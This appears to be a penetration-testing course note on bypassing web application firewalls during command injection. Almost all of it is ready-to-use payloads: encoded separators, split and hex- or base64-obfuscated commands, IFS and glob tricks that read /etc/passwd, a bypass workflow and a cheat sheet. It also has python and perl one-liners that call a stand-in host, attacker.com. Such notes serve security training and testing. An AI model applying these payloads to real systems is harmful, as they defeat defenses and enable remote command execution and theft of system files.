---
tags: [vapt, command-injection, advanced]
difficulty: advanced
module: "08 - Command Injection"
topic: "08.09 WAF Bypass for Command Injection"
---

# 08.09 — WAF Bypass for Command Injection

## What WAFs Block

WAFs typically look for:
- Injection operators: `;` `|` `&` `&&` `||`
- Dangerous commands: `id`, `whoami`, `cat`, `ls`, `wget`, `curl`, `bash`, `sh`
- Special characters: `` ` `` `$` `(` `)` `{` `}`
- Paths: `/etc/passwd`, `/bin/sh`, `cmd.exe`

The bypass goal: make the payload unrecognizable to the WAF while still executable by the shell.

---

## Encoding Bypasses

```bash
# URL ENCODING (single):
;id → %3Bid
|id → %7Cid
&id → %26id

# DOUBLE URL ENCODING:
;id → %253Bid
|id → %257Cid

# MIXED ENCODING:
%3bid     (lowercase %3b)
%3Bid     (uppercase %3B)
;%69d     (i URL-encoded in 'id')
;i%64     (d URL-encoded in 'id')

# UNICODE:
；id      ← unicode semicolon (U+FF1B) — some parsers normalize!
｜id      ← unicode pipe (U+FF5C)
```

---

## String Manipulation Bypasses

```bash
# CONCATENATE COMMAND STRINGS:
# If "id" is blocked:
'i'd'          ← shell concatenates quoted and unquoted strings: id
"i"d           ← same: id
i\d            ← backslash continuation: id
i$''d          ← empty string concatenation: id
$'\151''d'     ← octal escape for 'i': id

# EXAMPLES:
;'i'd            → ;id
;i$'\x64'        → ;id  (hex escape for 'd')
;$'\x69\x64'     → ;id  (both chars hex escaped)

# VARIABLE-BASED SPLITTING:
a=id; $a
a=i;b=d; $a$b
a=wh; b=oami; $a$b   → whoami

# IFS ABUSE:
# IFS (Internal Field Separator) defaults to space, tab, newline
# Can set IFS to any char and use it as separator:
IFS=,; a=id,; $a      → runs id
```

---

## Wildcards and Glob Patterns

```bash
# BYPASS COMMAND NAME FILTERS WITH WILDCARDS:
# ls is blocked? Use globs:
/bin/l?          → matches /bin/ls
/bin/ls or /bin/lf or /bin/l (anything!)
/usr/bin/wh?ami  → whoami
/bin/c?t         → cat
/?in/id          → /bin/id or /min/id (only /bin/id exists)
/b?n/?d          → /bin/id

# FIND COMMAND PATH:
which id         → /usr/bin/id
ls /usr/bin/id   → confirmed
/usr/bin/id      → use full path!

# BRACE EXPANSION (bash):
{id}             → runs id
{id,whoami}      → runs id and whoami
{/bin/id}        → same
```

---

## Environment Variable Tricks

```bash
# USE ENV VARIABLES TO BUILD COMMANDS:
# PATH contains /usr/bin:/bin etc.
# Can use PATH chars directly:

${PATH:0:1}       → / (first char of PATH = /)
${PATH:5:1}       → / (depends on PATH value)

# If PATH is /usr/bin:/bin:
${PATH:0:1}       → /
${PATH:5:1}       → b (position 5 in "/usr/bin")

# BUILD PATHS:
${PATH:0:1}bin${PATH:0:1}id   → /bin/id

# HOME:
$HOME             → /root or /home/www-data
${HOME:0:1}       → /

# HEREDOC:
id<<<""            → doesn't work for bypass
# But some tricks use <<< for input manipulation

# COMBINING:
c=${IFS:0:1}id    → cid (IFS is usually space, so c + space + id → wrong!)
# Better:
X=$'\x69\x64'; $X    → hex-encoded "id"
```

---

## Case Manipulation

```bash
# BASH IS CASE-SENSITIVE FOR COMMANDS:
ID   → command not found
Id   → command not found
id   → works!

# HOWEVER: Can use env to call with modified case:
# Not directly useful for bash, but WAFs often ignore case:

# WAF SEES: "ID" → not in blocklist → allows through
# Shell receives: ID → error... unless...

# TRICK WITH TYPESET/DECLARE:
typeset -l cmd; cmd=ID; $cmd   → runs 'id' (lowercased)!

# CASE CONVERSION:
$(tr '[A-Z]' '[a-z]' <<< 'ID')   → id
```

---

## Alternate Command Locations

```bash
# IF /bin/id IS BLOCKED BY PATH:
$(which id)        → uses 'which' to find path → /usr/bin/id → runs it
$(whereis id)      → similar
find / -name id -exec {} \;

# ALTERNATE PATHS:
/usr/bin/id
/usr/local/bin/id
/sbin/id

# PYTHON/PERL/etc AS ALTERNATIVE:
python3 -c "import os; os.system('id')"
perl -e "system('id')"
ruby -e "system('id')"
node -e "require('child_process').exec('id', (e,o)=>console.log(o))"

# CURL ALTERNATIVE IF WGET BLOCKED:
python3 -c "import urllib.request; urllib.request.urlopen('https://attacker.com')"
perl -MLWP::UserAgent -e "LWP::UserAgent->new->get('https://attacker.com')"
```

---

## Whitespace Bypass

```bash
# IF SPACES ARE FILTERED:

# Internal Field Separator:
cat${IFS}/etc/passwd
cat${IFS}${IFS}/etc/passwd

# Tab:
cat	/etc/passwd      ← literal tab character
cat%09/etc/passwd    ← URL-encoded tab (%09)

# Brace expansion (no space needed):
{cat,/etc/passwd}

# Redirect (no space needed in some contexts):
cat</etc/passwd      ← redirect instead of space!

# Newline as separator:
cat%0a/etc/passwd    ← newline after cat

# $IFS in quotes:
cat$IFS/etc/passwd
```

---

## Obfuscation Techniques

```bash
# HEX ENCODING:
$(printf '\x69\x64')        → id (each char hex encoded)
$(printf '\x63\x61\x74 \x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')
# = cat /etc/passwd

# OCTAL:
$(printf '\151\144')        → id (octal)

# BASE64 DECODE:
$(echo aWQ= | base64 -d)   → id (base64 of "id")
$(echo id | base64 | base64 -d | bash)

# REVERSE:
$(rev <<< 'di')             → id (reversed)
$(echo 'di' | rev)         → id

# XOR (more complex):
# Usually not needed but available via python:
$(python3 -c "print(chr(ord('i')),chr(ord('d')))")
```

---

## WAF Bypass Workflow

```
STEP 1: CONFIRM INJECTION WITHOUT WAF:
  Test locally or behind WAF: ;id → does it work?

STEP 2: IDENTIFY WHICH CHARS ARE BLOCKED:
  Try each separately: ; | & $ ( ) ` space id whoami cat
  See which ones get 403 or WAF block response

STEP 3: SUBSTITUTE BLOCKED CHARS:
  ; blocked → try %0a (newline)
  space blocked → try ${IFS}
  id blocked → try /usr/bin/id or $'\x69\x64'
  cat blocked → try /bin/cat or $(printf '\x63\x61\x74')

STEP 4: COMBINE:
  %0a/usr/bin/id     → newline + full path
  %0a$(printf%09'\x69\x64')  → newline + tab-space + hex-id

STEP 5: TEST BLIND (sleep):
  If visible output still blocked → confirm via sleep timing
  Or use OOB with Interactsh
```

---

## Common WAF Bypass Cheat Sheet

```
WHAT TO BYPASS      → TRY THESE
-----------         ---------
Semicolon ;         %0a, ||, &&, |
Space               ${IFS}, %09, $IFS, {cmd,arg}
id command          /usr/bin/id, $'\x69\x64', $(printf '\x69\x64')
cat command         /bin/cat, $(printf '\x63\x61\x74')
/etc/passwd         /etc/p?sswd, /etc/pass*, ${PATH:0:1}etc/passwd
whoami              who$'\x61'mi, /usr/bin/whoami
curl                /usr/bin/curl, python3 urllib
wget                /usr/bin/wget, curl, python3
```

---

## Related Notes
- [[08 - Chaining Operators]] — base operators
- [[02 - OS Command Injection Linux]] — basic Linux injection
- [[Module 15 - WAF Bypass]] — WAF bypass module
- [[14 - SQLi WAF Bypass Techniques]] — parallel WAF bypass for SQLi
